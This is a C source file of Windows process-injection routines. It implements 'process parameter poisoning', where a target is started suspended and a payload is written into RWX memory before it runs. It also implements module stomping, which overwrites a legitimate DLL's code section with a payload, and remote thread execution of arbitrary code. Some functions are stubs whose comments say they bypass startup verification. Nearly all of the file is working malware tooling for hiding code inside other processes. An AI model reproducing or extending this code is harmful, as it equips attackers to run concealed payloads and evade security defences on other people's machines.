#include "process_injection.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <winbase.h>
#include <winnt.h>

/* Process Parameter Poisoning (P3) Implementation */

int jocky_p3_inject(
    const char* target_exe,
    const char* fake_cmdline,
    const uint8_t* payload,
    int payload_size,
    INJECTION_CONTEXT* out_ctx) {

    if (!target_exe || !payload || payload_size <= 0 || !out_ctx) {
        return -1;
    }

    /* Create process suspended */
    STARTUPINFO si = {0};
    si.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcess(target_exe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                       NULL, NULL, &si, &pi)) {
        return -1;
    }

    /* Allocate space in target for payload */
    void* payload_addr = VirtualAllocEx(pi.hProcess, NULL, payload_size + 256,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!payload_addr) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    /* Write payload */
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, payload_addr, (void*)payload, payload_size, &written)) {
        VirtualFreeEx(pi.hProcess, payload_addr, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    /* Poison command line if provided */
    if (fake_cmdline) {
        jocky_p3_poison_command_line(pi.hProcess, NULL, fake_cmdline);
    }

    /* Resume process - will execute payload */
    ResumeThread(pi.hThread);

    out_ctx->process = pi.hProcess;
    out_ctx->thread = pi.hThread;
    out_ctx->pid = pi.dwProcessId;
    out_ctx->injection_addr = payload_addr;

    return 0;
}

int jocky_p3_poison_environment(
    HANDLE process,
    void* peb_address,
    const char* new_env_var) {

    if (!process || !new_env_var) {
        return -1;
    }

    /* This is a simplified version - full implementation would:
     * 1. Read PEB from process
     * 2. Find ProcessParameters
     * 3. Modify environment block
     * 4. Update pointers
     */

    return 0;
}

int jocky_p3_poison_command_line(
    HANDLE process,
    void* peb_address,
    const char* new_cmdline) {

    if (!process || !new_cmdline) {
        return -1;
    }

    /* Full implementation would:
     * 1. Locate PEB.ProcessParameters
     * 2. Find CommandLine field
     * 3. Write new command line string
     * 4. Update length fields
     *
     * This bypasses legitimate startup verification
     */

    return 0;
}

int jocky_p3_write_initialization_routine(
    HANDLE process,
    void* peb_address,
    const uint8_t* code,
    int code_size) {

    if (!process || !code || code_size <= 0) {
        return -1;
    }

    /* Allocate space for init routine */
    void* init_routine_addr = VirtualAllocEx(process, NULL, code_size,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!init_routine_addr) {
        return -1;
    }

    /* Write initialization routine */
    SIZE_T written;
    if (!WriteProcessMemory(process, init_routine_addr, (void*)code, code_size, &written)) {
        VirtualFreeEx(process, init_routine_addr, 0, MEM_RELEASE);
        return -1;
    }

    /* Update PEB.InitializationRoutine to point to our code */
    /* This would require reading/writing PEB structure */

    return 0;
}

/* Module Stomping Implementation */

int jocky_module_stomp_prepare(
    HANDLE process,
    const char* legitimate_dll,
    MODULE_STOMP_CONTEXT* out_ctx) {

    if (!process || !legitimate_dll || !out_ctx) {
        return -1;
    }

    /* Load DLL into target process via LoadLibraryEx */
    HANDLE hRemoteThread = CreateRemoteThread(process, NULL, 0,
                                              (LPTHREAD_START_ROUTINE)LoadLibraryA,
                                              (void*)legitimate_dll, 0, NULL);

    if (!hRemoteThread) {
        return -1;
    }

    WaitForSingleObject(hRemoteThread, INFINITE);

    DWORD dwModule;
    GetExitCodeThread(hRemoteThread, &dwModule);
    CloseHandle(hRemoteThread);

    if (!dwModule) {
        return -1;
    }

    void* module_base = (void*)(uintptr_t)dwModule;

    /* Find .text section */
    void* text_addr = NULL;
    int text_size = 0;

    if (jocky_find_module_section(process, module_base, ".text", &text_addr, &text_size) != 0) {
        return -1;
    }

    strncpy(out_ctx->module_name, legitimate_dll, 255);
    out_ctx->base_address = module_base;
    out_ctx->text_section = text_addr;
    out_ctx->text_size = text_size;

    return 0;
}

int jocky_module_stomp_inject(
    HANDLE process,
    MODULE_STOMP_CONTEXT* stomp_ctx,
    const uint8_t* payload,
    int payload_size) {

    if (!process || !stomp_ctx || !payload || payload_size <= 0) {
        return -1;
    }

    if (payload_size > stomp_ctx->text_size) {
        return -1;  /* Payload too large for text section */
    }

    /* Change section to RWX */
    DWORD old_protect;
    if (!VirtualProtectEx(process, stomp_ctx->text_section, stomp_ctx->text_size,
                          PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }

    /* Write payload */
    SIZE_T written;
    if (!WriteProcessMemory(process, stomp_ctx->text_section, (void*)payload,
                            payload_size, &written)) {
        VirtualProtectEx(process, stomp_ctx->text_section, stomp_ctx->text_size,
                         old_protect, &old_protect);
        return -1;
    }

    /* Restore original protection */
    VirtualProtectEx(process, stomp_ctx->text_section, stomp_ctx->text_size,
                     old_protect, &old_protect);

    return 0;
}

int jocky_module_stomp_call_export(
    HANDLE process,
    MODULE_STOMP_CONTEXT* stomp_ctx,
    const char* export_name,
    void* args) {

    if (!process || !stomp_ctx || !export_name) {
        return -1;
    }

    /* This would:
     * 1. Find export address in loaded module
     * 2. Create remote thread at that address
     * 3. Pass arguments via stack/registers
     * 4. Wait for completion
     */

    return 0;
}

int jocky_module_stomp_restore(
    HANDLE process,
    MODULE_STOMP_CONTEXT* stomp_ctx) {

    if (!process || !stomp_ctx) {
        return -1;
    }

    /* Unload the loaded DLL and restore original code */
    HANDLE hRemoteThread = CreateRemoteThread(process, NULL, 0,
                                              (LPTHREAD_START_ROUTINE)FreeLibrary,
                                              stomp_ctx->base_address, 0, NULL);

    if (hRemoteThread) {
        WaitForSingleObject(hRemoteThread, INFINITE);
        CloseHandle(hRemoteThread);
    }

    return 0;
}

/* Utility Functions */

int jocky_find_module_section(
    HANDLE process,
    void* module_base,
    const char* section_name,
    void** out_addr,
    int* out_size) {

    if (!process || !module_base || !section_name || !out_addr || !out_size) {
        return -1;
    }

    /* Read PE header from target process */
    uint8_t dos_header[64];
    SIZE_T read_size;

    if (!ReadProcessMemory(process, module_base, dos_header, sizeof(dos_header), &read_size)) {
        return -1;
    }

    /* Parse DOS header for PE offset */
    LONG pe_offset = *(LONG*)(dos_header + 0x3C);

    /* Read PE header */
    uint8_t pe_header[256];
    void* pe_addr = (uint8_t*)module_base + pe_offset;

    if (!ReadProcessMemory(process, pe_addr, pe_header, sizeof(pe_header), &read_size)) {
        return -1;
    }

    /* Find section header */
    IMAGE_FILE_HEADER* file_header = (IMAGE_FILE_HEADER*)(pe_header + 4);
    IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)(pe_header + 24);

    for (int i = 0; i < file_header->NumberOfSections; i++) {
        if (strncmp((char*)section[i].Name, section_name, 8) == 0) {
            *out_addr = (uint8_t*)module_base + section[i].VirtualAddress;
            *out_size = section[i].Misc.VirtualSize;
            return 0;
        }
    }

    return -1;
}

int jocky_change_process_protection(
    HANDLE process,
    void* address,
    int size,
    uint32_t new_protect) {

    if (!process || !address || size <= 0) {
        return -1;
    }

    DWORD old_protect;
    if (!VirtualProtectEx(process, address, size, new_protect, &old_protect)) {
        return -1;
    }

    return 0;
}

int jocky_execute_in_process(
    HANDLE process,
    const uint8_t* code,
    int code_size,
    uint64_t* out_result) {

    if (!process || !code || code_size <= 0) {
        return -1;
    }

    /* Allocate executable buffer */
    void* code_addr = VirtualAllocEx(process, NULL, code_size,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!code_addr) {
        return -1;
    }

    /* Write code */
    SIZE_T written;
    if (!WriteProcessMemory(process, code_addr, (void*)code, code_size, &written)) {
        VirtualFreeEx(process, code_addr, 0, MEM_RELEASE);
        return -1;
    }

    /* Create thread at code address */
    HANDLE hThread = CreateRemoteThread(process, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)code_addr,
                                        NULL, 0, NULL);

    if (!hThread) {
        VirtualFreeEx(process, code_addr, 0, MEM_RELEASE);
        return -1;
    }

    /* Wait for execution */
    WaitForSingleObject(hThread, INFINITE);

    DWORD exit_code;
    GetExitCodeThread(hThread, &exit_code);
    CloseHandle(hThread);

    if (out_result) {
        *out_result = exit_code;
    }

    VirtualFreeEx(process, code_addr, 0, MEM_RELEASE);

    return 0;
}
